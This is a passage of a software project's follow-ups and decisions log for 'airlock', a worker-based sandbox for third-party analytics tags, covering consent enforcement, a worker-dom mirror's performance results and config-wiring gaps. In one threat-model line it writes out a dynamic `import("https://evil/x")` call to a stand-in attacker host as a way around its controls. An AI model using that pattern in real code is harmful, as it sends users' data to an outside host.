[slice-03](specs/017-mvp3-purpose-vector-consent/slice-03-seal-hold-drop.md).
**ADR-0007's three-point consent model is now fully enforced for GA4** (mapper
reshape ①, cookie-capability deny ②, seal hold/strict-drop ③) — see
[docs/releases/mvp3.md](releases/mvp3.md). Named follow-ups, not attempted here:

- **The worker `ctx` re-send for the mapper *reshape* ①.** A flushed beacon
  carries whatever `consent`-reshape (017-01) was folded into `ctx` at BOOT
  time, never a mid-session reshape update — this slice gates *dispatch*
  (send/hold/drop), not the *payload*. Still needs the new worker message
  type + re-send the 017-01 "Mid-session consent update" bullet above
  describes.
- **Per-purpose replay/STOP on revoke.** 017-03 only handles the
  pending→granted direction (flush). A granted→denied/pending edge mid-session
  does not retroactively un-send already-dispatched beacons (ADR-0007: "already-
  sent cannot be unsent") — and does not currently stop a THEN-pending purpose's
  future beacons from newly holding either (that falls out of `egressVerdict`
  being re-evaluated per-dispatch, but no explicit revoke-driven test/behavior
  was authored here).
- **Prerender-aware per-purpose holding.** AD-9's existing prerender-aware
  held-until-activation model is binary; making IT per-purpose (as opposed to
  just the pending-consent hold this slice delivers) is not addressed.
- **Strict-regime declaration site.** This slice declares strict via a `consent`
  input **boot property** (`consentStrict`) — the simplest available option
  among ADR-0007's still-open "where is the regime declared" question, not a
  pinned seam-contract answer. A CMP driver or per-connector manifest property
  are both still open alternatives if a real deployment needs finer control.
- **Alloy / wrapped-SDK seal enforcement.** Like 017-01's mapper reshape, the
  seal's `egressPurposes` gate is wired for GA4 only (`adapters/eds/index.js`);
  alloy's `purposes` manifest annotation (012-04) remains declared-not-enforced
  — no `egressPurposes` gate is wired at alloy's wrapped-SDK dispatch seam
  (`core/wrapped-sdk-host.js`). Consent enforcement for alloy is out of scope
  for spec 017 (GA4-only, per the spec's own framing).

## Spec 020 (alloy XDM governance) follow-ups — spec 020 COMPLETE (alloy governed)

**Resolved (spec 020, 2026-08-31):** the 017-03 alloy-consent residual above is
**RESOLVED** — alloy egress is now consent-enforced at `core/wrapped-sdk-host.js`'s
`dispatchInterceptedFetch` via `egressVerdict(consent, egressPurposes, {strict:true})`
(the TRUSTED seam-side drop) + the in-chamber `setConsent` command
(`connectors/alloy/consent.js` → the Adobe 2.0 shape, driven `configure → setConsent →
sendEvent`). The probe (020-01) found alloy's payload already read-minimized by
construction (`toXdm` 2-field allowlist + `context:[]`), with an optional Edge-safe
defense-in-depth strip. Recorded in [ADR-0013](decisions/adr-0013-alloy-consent-enforcement.md)
(supersedes ADR-0012's alloy-Split + resolves ADR-0007's alloy residual). **Named follow-ons:**
- **`pending → hold+flush` for the alloy seam** — 020-02 does `pending → drop` (fail-closed, the
  first-impl choice: the alloy interact is a synchronous vendor round-trip, not a queued `{url,body}`
  beacon like GA4's 017-03 async seal, so a hold+flush needs a replay decouple that does not yet exist
  for the wrapped-SDK path). **Open question (020-02 arch review):** is pending-window data loss
  acceptable for alloy, or should hold+flush be prioritized? Resolution trigger: a deployment where
  the pending-consent window materially drops alloy analytics/personalization.
- **The live `setConsent(collect:n)` flow + HTML-rig consent wiring** — 020 characterized the setConsent
  mechanism from the alloy@2.35.0 source; a live `configure → setConsent(collect:n) → sendEvent`
  (asserting the interact is suppressed) + wiring `rig/alloy-core-host-harness.html` /
  `alloy-coalescing-core-harness.html` to pass `consent`/`egressPurposes`/`payloadDenylist` for a
  live/browser exercise is a named creds-gated follow-on (013 infra).
- **Purpose-list mirror drift** — alloy's collect-governing purposes are stated in THREE places
  (`connectors/alloy/connector.js`'s manifest `purposes.egress`, `connectors/alloy/consent.js`'s
  `COLLECT_PURPOSES`, and each caller's injected `egressPurposes`), a documented-but-unenforced mirror
  (the same accepted idiom as GA4's `DATA_USE_PURPOSES`). A manifest change silently diverges the two
  levers; no test guards it. Resolution trigger: if `purposes.egress` ever changes, or on a third such
  connector (rule-of-three → a shared accessor).
- **The disclosed dynamic-`import()` residual** (016, worker CSP) bounds the "held at the seam" trust
  claim for ALL seam controls (ceiling / config-integrity / consent), not just consent — a `type:"module"`
  worker's `await import("https://evil/x")` exfiltrates via the specifier fetch, which no JS shim withholds;
  gated by a worker `connect-src` CSP (host-controlled response headers), not by these seam controls.

## Performance thesis (R-008) — post-MVP4

The DOM-cost-containment investigation ([R-008](research/R-008-costly-dom-martech-containment.md)) — how
airlock contains costly-DOM martech (the INP/CWV thesis). Named deferred items:

### ~~Decision: worker-dom compatibility layer (POC-B)~~ — RESOLVED 2026-09-02 ([ADR-0014](decisions/adr-0014-worker-dom-compat-minimal-mirror.md))
**Deferred:** the short-term compatibility/migration layer (Lever 2) — run an **unmodified** third-party tag
in a chamber against a virtual DOM (à la `@ampproject/worker-dom`), its computation off-thread, mutations
budgeted onto the main thread. The thing that unlocks the martech long tail whose vendors won't rewrite. NOT
the end-state (govern+schedule connectors are), and with **documented limits** (tags needing live layout
reads / sync storage / their own `window` won't work). ~~**Resolution trigger:** after POC-A lands its INP
scoreboard — then a worker-dom feasibility spike.~~ **Spike DONE ([spec 024](specs/024-worker-dom-compat-spike/spec.md),
2026-09-01):** worker-dom's async-mutation model is **AD-4-compatible** (postMessage, no SAB — the reason it,
not Partytown, is the base); **works** unmodified for write/compute-heavy tags, **won't work** for
sync-layout-read tags (layout-thrash included — a Lever-1 job). **Now-pending decision (an ADR):** adopt the
async model as the Lever-2 compat layer — **wrap `@ampproject/worker-dom` (pre-1.0/semi-maintained) vs build a
minimal airlock mirror** (leaning minimal) — then a downstream build-spec (its first AC: the confirming INP
integration probe). Detail + the works/won't-work map: R-008 + the spike's Findings.

**Mechanism VALIDATED — spike [025-01](specs/025-worker-dom-mirror/slice-01-ga4-drop-in-gate.md) DONE (2026-09-02).**
ADR-0014 chose the minimal airlock-owned mirror; 025-01 ran the confirming probe against
`@ampproject/worker-dom@0.36` and returned a **MECHANISM GO** — neither ADR-0014 kill criterion fired:
**(a)** the main-thread mutation-apply is **INP-safe** (apply p75=**8ms** vs naive 200ms, band [8,8], all 6000
mutations applied; orchestrator-re-run, not just trusted) — the ADR's central unproven bet, now grounded;
**(b)** a **real target-shape tag** (Prism 1.30) runs off-thread INP-safe — not a population-mirage (but the
population **SIZE stays open** — one worked example, not a census). **New scope input for 025-02:** the mirror
needs **ambient-global proxying beyond DOM APIs** — `screen`/`sendBeacon` are absent in the Worker global
(model-inherent → a mediated proxy the mirror must add) and `document.cookie` is unimplemented (lib-fixable).
This is anticipated by ADR-0014's open question "the exact minimal DOM-API subset — the build-spec defines it";
025-02's subset must include these ambient globals, not just DOM. **GA4 adoption axis (separate verdict, per the
ratified "drop-in is the bonus"):** unmodified gtag.js boots + runs but can't beacon for exactly those
ambient-global reasons — an **adoption/feature** signal, **not** a mechanism KILL (GA4 stays supported via the
wire-protocol connector; the drop-in is the bonus migration path). **Two benign worker-side open threads** (a
20000-element apply stall; a Prism throughput ceiling) folded in as 025-02 worker-backpressure investigation
items — not INP. **PENDING (maintainer's strategic call):** 025-02 (build the minimal mirror now, mechanism-GO'd)
**vs** prioritising [026](specs/026-generic-pixel-connector/spec.md) (the proven common-tag pixel-connector
leverage) first. ADR-0014 stands **validated, not amended** (immutable). Detail: 025-01 Findings/Outcome.

**Mirror BUILT — slice [025-02](specs/025-worker-dom-mirror/slice-02-mirror-core.md) DONE (2026-09-02).** airlock's
**own** minimal bidirectional worker-dom mirror ships (Option C realized) — a worker-side DOM mirror + a
main→worker event-forward + worker→main mutation-flush channel + a frame-budgeted main-thread apply coordinator
(reusing `core/scheduler.js`) + a mutation-apply **safety allowlist** over the real-DOM write surface.
**ADR-0014's central apply-INP bet — flagged UNMEASURED at authoring — is now MEASURED on airlock's own code:**
AC5a click-p75 = **8ms** (band [8,8], `workCompleted` full) reproducing 025-01's `@ampproject/worker-dom` band on
airlock's OWN mirror (orchestrator-re-run), and AC5b a **falsifiable** heavy-apply budget-boundedness proof
(frame-budgeted vs a naive 2000ms one-blast). `@ampproject/worker-dom` is now **devDep-only** (enumerably not
imported by any runtime module). A 3-round frame-critique caught two deep issues pre-code (the missing
main→worker event channel; an apply-INP measurement confound); both review passes then caught + fixed a
real-DOM-throw batch-crash. **Deferred → 025-03+:** a REAL tag (Prism / `innerHTML`) + a full value-level style
sanitizer covering **layout abuse** (fixed/absolute overlay clickjacking), not just URL schemes; `id`-based
DOM-clobbering hardening; ambient-global proxies (`screen`/`sendBeacon`/`cookie`) → 025-04; the Lever-3
budget/circuit-breaker; and the DOM-chamber's `build.mjs` bundle entry (the same live-rollout gap the pixel
worker has). ADR-0014 remains **validated, not amended**.

**Real tag through the mirror — slice [025-03](specs/025-worker-dom-mirror/slice-03-real-tag-innerhtml.md) DONE
(2026-09-02): the central apply-INP bet, measured on a REAL `innerHTML`-heavy tag, is a NET INP REGRESSION.**
025-02 proved the mechanism on a **synthetic** chunkable-write tag (8ms). 025-03 ran a **real** one — Prism syntax
highlighting via `element.innerHTML` — governed-through-the-mirror **vs** the naive main-thread `innerHTML`
baseline, apply-window p75 (023's within-storm method, NOT the async-decoupled click-p75 false-green 025-02
flagged). Result, orchestrator-re-run, both review passes confirming the rig is FAIR: **governed apply-window
p75 = 24.1ms vs naive 11.5ms (~2×) — a net regression**. The sanitize round-trip (main-thread `DOMParser` parse +
whole-tree walk + reserialize over the **148KB output**) exceeds the off-thread tokenization savings (the **12KB
input**), so moving Prism behind the airlock makes the apply *slower* on the main thread than just letting Prism
write. **This is the honest Tier-0-viability boundary** ADR-0014 itself warned about ("Tier 0 covers a MINORITY of
costly tags"): airlock's mirror contains INP for the **chunkable-write** subset (many structured DOM ops that the
frame-budgeted coordinator can spread across frames) but is a main-thread **LOSS** for **`innerHTML`-heavy** tags —
which are most real DOM-heavy tags. ADR-0014 is **recorded-against, not amended** (immutable): the central bet is
now measured on real work with an **adverse** result on this tag class. **Strategic implication for the thread:** the
mirror's realized value is **narrow** — it helps chunkable structured-write tags, not blob-`innerHTML` tags. Options
for the innerHTML class (none built): a **cheaper sanitize** (streaming/tokenizing sanitizer that avoids the full
parse+reserialize round-trip), **chunked DOM-building** (turn one `innerHTML` blob into many budget-schedulable
structured ops so it re-enters the subset the mirror *does* help), or simply **leaving innerHTML-heavy tags on the
main thread** and reserving the mirror for the tags it measurably helps. **Deferred → 025-04+:** ambient-global
proxies (`screen`/`sendBeacon`/`cookie`); the Lever-3 budget/circuit-breaker; Tier-1 SAB (could serve sync-read
tags but re-incurs the AD-4 embed breakage ADR-0014 ruled out for Tier 0). A full value-level style sanitizer
(layout-abuse / clickjacking, not just URL schemes) also remains — 025-03 shipped the URL/`on*`/tag-strip denylist
(`core/sanitize-html.js`), an honest denylist boundary (mutation-XSS out of scope), not the value-level allowlist.

**DECISION 2026-09-03 — Lever 2 triage posture; 025-04 + Tier-1 SAB PAUSED** (see
[lightweight-decisions.md](decisions/lightweight-decisions.md#2026-09-03--worker-dom-mirror-lever-2-triage-posture-pause-deeper-infra)).
The maintainer, reading the 025-03 net-regression above, chose to **triage and move on**: the mirror stays shipped for
the **chunkable-write** subset it measurably helps, `innerHTML`-heavy tags stay on the main thread, and the deeper
worker-dom infra here — **025-04 ambient-global proxies** and **Tier-1 SAB** — is **PAUSED** (not killed) in favor of
the proven **026 pixel-connector** leverage. The two `innerHTML`-class escape hatches (cheaper streaming sanitizer;
chunked DOM-building) remain the named revisit conditions, alongside a real-stack breadth survey sizing the
chunkable-write subset. Lever-3 (below) is a **separate**, cross-cutting deferral, unaffected by this call.

### Decision: Lever 3 circuit-breaker (budget enforcement) — DEFERRED
**Deferred:** POC-A builds Lever 3's **measurement** half (the before/after INP scoreboard). The
**enforcement** half — a per-tag INP/TBT budget that throttles/trips a runaway tag, + the inspector surfacing
"tag X cost you N ms" — is deferred. **Resolution trigger:** once the measurement rig exists (POC-A) and a
tag is shown to blow a budget; also needs the "what does trip do (defer/throttle/kill), and does killing
mid-mutation leave the DOM half-written?" question answered. Detail: R-008 Open questions.

## Spec 032 (config-driven instrumentation) follow-ups — surfaced by the 032-01 reviews (2026-09-04)

> Deferred during 032-01 (`boot(config)` + the composite handle). The config surface is deliberately **pre-1.0**;
> the later **1.0 API pin** (MVP6) is where any of these that survive get frozen. None blocked 032-01.

### Decision: Declarative event capture / per-event routing — DEFERRED
**Deferred:** 032 ships the config that **selects + parameterizes** connectors + declares governance; **event
capture stays built-in** (GA4's EDS wiring) or the site's explicit `push()`. Config-expressed capture rules
(selectors→events) and **per-event routing** (which event goes to which connector) are out of scope. A specific
sub-question the 032-01 arch pass raised: GA4 is a declared **`["*"]` catch-all** while pixels are default-deny, so
`composite.push({event:"lead"})` in a `[ga4, pixel]` config **also** emits a GA4 `lead` — should a multi-connector
`ga4` entry gain an optional `eventMap`-style gate so "each tag reacts" is symmetric? (The composite fan-out is
already gated by each connector's declared `manifest.events`, so nothing leaks to a connector that doesn't declare
the event; this is about GA4's *intended* catch-all, not a leak.)
**Resolution trigger:** a real adopter needs event-name→connector routing the built-in capture + `push()` don't
cover; or the 1.0 pin.

### Decision: `*_MANIFEST_EVENTS` single source of truth — DEFERRED (craft nit)
**Deferred:** `boot(config)`'s fan-out gate uses local mirrors `GA4_MANIFEST_EVENTS = ["*"]` /
`HELIX_RUM_MANIFEST_EVENTS = ["top","error","cwv"]` of the connectors' own `manifest.events`, kept correct by a
"keep in sync" comment (the pixel path avoids this by deriving from the vendor factory). A single source of truth
(importing the vocabularies from the connector modules — whose manifests are instance-constructed inside factories)
would remove the drift risk. Pragmatic pre-1.0 choice.
**Resolution trigger:** helix-rum's checkpoint set widens again (spec 022-05), or a third connector needs a
non-`["*"]` vocabulary — extract the shared accessor then (rule-of-three).

### Decision: Composite read-namespacing + `sampled` surfacing — DEFERRED (minor)
**Deferred:** the composite `getState`/`stats` read `handles[0]` (declaration-order-coupled; documented), and the
composite does not surface helix-rum's `sampled` flag. Terminal pre-1.0 choices; a per-connector read namespace
(e.g. `getState({connector})`) would resolve both.
**Resolution trigger:** a caller needs a specific connector's projection from a multi-connector composite; or the 1.0 pin.

### Decision: alloy config-wiring (`{type:"alloy"}` in `boot(config)`) — DEFERRED to its own spec
**Deferred:** 032 (the config-driven `boot(config)` + its schema) covers the `createAirlock`-shaped, adapter-booted
connectors — GA4, the three pixel vendors, helix-rum. **alloy is not among them:** it has no `adapters/eds/` boot,
being hosted via `core/wrapped-sdk-host.js` + `connectors/alloy/*` (async stock-SDK load, `createConnectorHost`,
`alloy-chamber.worker.js`, `handle` returns `[]` — a different handle shape than the composite fans to), exercised
only in `rig/`/`test/`. So a `{type:"alloy"}` config entry is alloy's **first-ever adapter boot — spike-sized**,
deliberately out of 032's scope. **Consequence to track:** until this lands, airlock's config/authoring surface
covers GA4 + pixels + RUM but **NOT Adobe/alloy** — half of MVP6's named "GA4 + Adobe/alloy" supported subset
(`docs/releases/mvp6.md`). alloy still runs today via its own host path + rigs; only its *config-driven boot* is
missing.
**Resolution trigger:** before the MVP6 real-production-site validation on an Adobe/alloy stack (the adoption proof
needs alloy instrumentable via the config surface), OR when a real EDS adopter needs alloy in `boot(config)`. Likely
a spike (alloy's adapter-boot path + a composite-compatible handle) then a slice.
**Progress (2026-09-04):** [spec 033](specs/033-alloy-config-wiring/spec.md)'s spike **033-01 returned GO** — the
classic `importScripts` alloy worker + a same-origin stock bundle *do* load under the enforced EDS CSP (the block is
Trusted Types, not `strict-dynamic`; fix = a worker-realm TT policy in airlock's own worker), and the
`driveEvent`→composite reconciliation is feasible. The stock-bundle load is decided by
**[ADR-0016](decisions/adr-0016-alloy-stock-bundle-site-supplied.md)**: adopter-supplied `bundleUrl` (airlock does
not ship it), same-origin byte-pinned recommended, cross-origin (Adobe CDN) supported. The gap CLOSES when **033-02**
lands the build.
